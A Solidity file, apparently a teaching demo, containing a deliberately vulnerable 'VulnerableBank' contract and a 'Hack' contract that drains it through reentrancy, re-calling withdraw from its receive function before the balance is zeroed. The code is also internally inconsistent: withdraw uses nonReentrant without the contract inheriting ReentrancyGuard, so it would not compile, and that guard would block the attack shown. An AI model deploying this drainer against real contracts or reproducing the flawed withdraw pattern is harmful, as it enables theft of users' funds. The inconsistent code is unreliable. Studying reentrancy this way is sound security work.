// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
contract VulnerableBank{


    mapping(address=>uint256) balance;
    function deposit() external payable  {
        balance[msg.sender]+=msg.value;

    }
    function withdraw() external nonReentrant{

        require(balance[msg.sender]>0,"balance not enough");
        (bool r,)=msg.sender.call{value:balance[msg.sender]}("");
        balance[msg.sender]=0;
        require(r,"tx fail");
        //if you use transfer tx maybe fail due to gas consumption
        //payable(msg.sender).transfer(balance[msg.sender]);
  
    }

    fallback() external payable { }
    receive() external payable { }
}


contract Hack{

    VulnerableBank bank;

    constructor(VulnerableBank _bank){
        bank=_bank;
    }

    function hack() external  payable {

        bank.deposit{value:1 ether}();
        bank.withdraw();

    }

    receive() external payable {

        if(address(bank).balance>0){
            bank.withdraw();
        }

     }

    fallback() external payable { }
    function balanceOf() external view returns (uint256){
        return address(this).balance;
    }
}
